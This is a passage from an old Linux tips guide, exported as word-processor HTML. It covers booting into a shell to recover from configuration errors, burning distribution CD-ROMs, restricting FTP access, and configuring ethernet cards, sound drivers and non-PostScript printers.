is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >usualy due to a configuration error. You can tell LILO to mount another kernel you may have, like a "safe" or</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >"old" image you kept for these cases. If the problem is in initialization scripts, you can tell LILO to boot</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >directly into a shell with the following boot command line:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >LILO boot: linux init=/bin/sh</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Where "linux" would be your kernel image.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.25</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 25: Making CD-ROM images</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >With other operating systems, such as Microsoft Windows or IBM OS/2, you are not allowed in the license to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >make your own CD-ROM with the OS on it and then distribute it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux, being Open Source and free, can be copied. You can download a distribution or buy it from an online</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >store and burn your own copy, and then install it on many computers, or give it to your friends. Usually, you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >will find instructions on how to do that on the FTP server for your favorite distribution. You will need the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >main directory on the CD-ROM. The sources are not needed since they are available from the FTP site.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Some distributions also come with ISO images of their CD-ROM. This is a single file that can be put onto a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >CD-ROM, and will create a full file system with files on it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >One thing you have to be careful is not to copy commercial programs. The basic CD-ROM where the Linux</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >distribution is located is composed of free software. But some distributions may come with other commercial</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >programs, and you should read the license first.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.26</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 26: FTP access restrictions</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you first install Linux, it comes with a lot of Internet services running, including mail, telnet, finger</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and FTP. You really should disable all those that you don't need from /etc/inetd.conf and your startup scripts.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >FTP may be very useful, but must be configured correctly. It can allow people to log into their accounts, it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >can allow anonymous users to login to a public software directory, and it can display nice messages to them.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The files that you will probably want to modify are /etc/ftpusers and /etc/ftpaccess.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The file /etc/ftpusers is very simple. It lists the people that will not be allowed to use FTP to your system. The</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >root account, and other system accounts should be in that file.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The file /etc/ftpaccess is a bit more complex and controls the behaviour of the FTP server. It tells it what to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >use as README file to display on a directory listing, what kind of logs to create and what messages to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >display.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that if you create an anonymous FTP area, you will need to read the FTP man page and do exactly what</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >it tells you to avoid possible security risks.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <H1 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial; mso-fareast-language: ZH-CN;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="3" >2.</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="3" >Hardware</FONT></SPAN></SPAN></A><SPAN style="mso-bookmark: _Toc196894728;"  ></SPAN><SPAN lang="EN-US" style="mso-fareast-language: ZH-CN;"  ></SPAN></H1>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Hardware support has once been a very big problem with Linux. Generic hardware always was well</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >supported, but most of the hardware today is unfortunately non-generic. 100% Sound Blaster compatible</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >cards often are not detected by the Sound Blaster driver, and non-PostScript printers don't accept PostScript</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >input unless a program previously converted it. These are the kind of problems we solve here.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.1</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 1: Detecting 2 ethernet cards</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To configure an ethernet card in Linux, you need to enable it in the kernel. Then the kernel will detect your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >ethernet card if it is at a common IO port. But it will stop there, and will never check if you have 2 ethernet</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >cards.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick is to tell the ethernet driver that there are 2 cards in the system. The following line will tell the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >kernel that there is an ethernet card at IRQ 10 and IO 0x300, and another one at IRQ 9 and IO 0x340:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ether=10,0x300,eth0 ether=9,0x340,eth1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can add that line on bootup at the "boot:" prompt, or in the /etc/lilo.conf file. Don't forget to run:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >lilo</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >That will reload the lilo.conf file and enable changes.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.2</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 2: Everything on sound cards</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A sound card can be easy or hard to detect. It depends on who made it. Many Sound Blaster Compatible</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >cards in fact are not compatible with the Linux Sound Blaster driver. Other cards will be compatible with a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >driver you would never have thought of.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are multiple drivers for Linux. Currently the kernel comes with its own set of sound drivers, plus the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >OSS/Free drivers. These will support most generic cards. In the installation program, or when compiling your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >kernel, you can pick the sound card that matches yours, or the one that matches the chipset on your sound</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >card (for example, the Sound Blaster PCI64 card uses the AudioPCI chipset).</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If your sound card is not supported by the kernel, you will need to get another driver. 2 popular ones are</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >ALSA available from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://alsa.jcu.cz </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >and OSS/Linux available from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.opensound.com</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >OSS/Linux is a commercial product that supports a lot of cards not available in other drivers because of card</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >specification restrictions. You will need to see the list of supported cards in each driver and pick the driver</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you need.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.3</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 3: Non-PostScript printers</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Unfortunately, most printers are non-PostScript compatible. This means that your LPR program won't like it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You will probably notice that when you first use 'lpr' to print, the output looks weird on your printer. This is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >because these models do not support PostScript. You will need a converting program for it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that newer versions of RedHat already have those programs or similar filters so it may not apply to all</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux systems.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First, you need to go read the Printing HOWTO to find out how to use lpr and related printing programs.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Then, you'll need to get 2 programs from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://metalab.unc.edu</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >:</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >bjf</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >aps</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >These are the filters to convert text and PostScript to your printer's format.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First, install bjf which will be used to print text. Installation is very simple. type:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >make</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >cp bjf /bin/bjf</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Then, make a simple shell script to print text files and call it print.sh:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >#!/bin/sh</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >/bin/bjf &lt;$1&gt; /dev/lp0</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Where /dev/lp0 is your printer.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Now, install aps by running the SETUP script in its package. It's really easy to setup, but you do need to have</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the GhostScript program installed prior to installation. You are now ready to print PostScript files from, for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >example, Netscape or XV.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.4</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 4: Use Windows special keys in Linux</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Why are all the new keyboards sold with Win95 keys on them? How about making them do real keyboard</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >functions while in X Window? Here is how.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" 